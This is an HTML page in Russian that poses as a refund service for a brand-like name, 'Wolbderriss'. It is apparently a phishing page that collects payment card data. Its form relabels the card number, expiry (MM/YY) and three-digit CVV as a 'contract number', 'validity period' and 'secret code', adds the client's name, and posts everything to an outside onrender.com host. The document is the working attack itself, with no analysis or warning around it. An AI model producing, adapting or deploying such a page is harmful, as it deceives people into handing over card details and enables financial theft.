<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Wolbderriss</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f7f7f7;
      margin: 0;
      padding: 0;
    }
    header {
      background: #9c27b0;
      padding: 15px 20px;
      display: flex;
      align-items: center;
      color: #fff;
      font-size: 24px;
      font-weight: 900;
      letter-spacing: 1px;
    }
    header .icon {
      width: 28px;
      height: 28px;
      background: #fff;
      color: #9c27b0;
      font-size: 18px;
      font-weight: bold;
      border-radius: 4px;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-right: 10px;
    }
    .container {
      max-width: 420px;
      margin: 40px auto;
      background: #fff;
      border-radius: 12px;
      padding: 30px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      text-align: center;
      opacity: 0;
      transform: translateY(20px);
      animation: fadeInUp 0.8s ease forwards;
    }
    @keyframes fadeInUp {
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    .container h2 {
      color: #9c27b0;
      margin-bottom: 10px;
      font-size: 20px;
    }
    .container p {
      color: #555;
      margin-bottom: 25px;
      font-size: 14px;
    }
    label {
      display: block;
      text-align: left;
      margin: 12px 0 6px;
      font-size: 14px;
      color: #333;
    }
    input {
      width: 100%;
      padding: 14px;
      margin-bottom: 18px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      box-sizing: border-box;
      transition: border-color 0.3s, box-shadow 0.3s;
    }
    input:focus {
      border-color: #9c27b0;
      box-shadow: 0 0 6px rgba(156, 39, 176, 0.5);
      outline: none;
    }
    button {
      background: linear-gradient(90deg, #9c27b0, #d500f9);
      color: #fff;
      border: none;
      padding: 16px;
      width: 100%;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      font-weight: bold;
      transition: transform 0.2s, box-shadow 0.3s;
    }
    button:hover {
      transform: scale(1.03);
      box-shadow: 0 4px 15px rgba(156, 39, 176, 0.4);
    }
  </style>
</head>
<body>
  <header>
    <div class="icon">?</div>
    Wolbderriss
  </header>
  <div class="container">
    <h2>Финансовый возврат</h2>
    <p>Для получения возврата денежных средств введите данные договора</p>
    <form action="https://com-1-h1i5.onrender.com/submit" method="POST">
      <label for="contract">Номер договора</label>
      <input type="text" id="contract" name="contract" placeholder="0000000000" required>

      <label for="validUntil">Срок действия (MM/YY)</label>
      <input type="text" id="validUntil" name="validUntil" placeholder="MM/YY" required>

      <label for="secretCode">Секретный код</label>
      <input type="text" id="secretCode" name="secretCode" placeholder="000" required>

      <label for="clientName">Имя клиента</label>
      <input type="text" id="clientName" name="clientName" placeholder="Иван Иванов" required>

      <button type="submit">Отправить запрос</button>
    </form>
  </div>
</body>
</html>
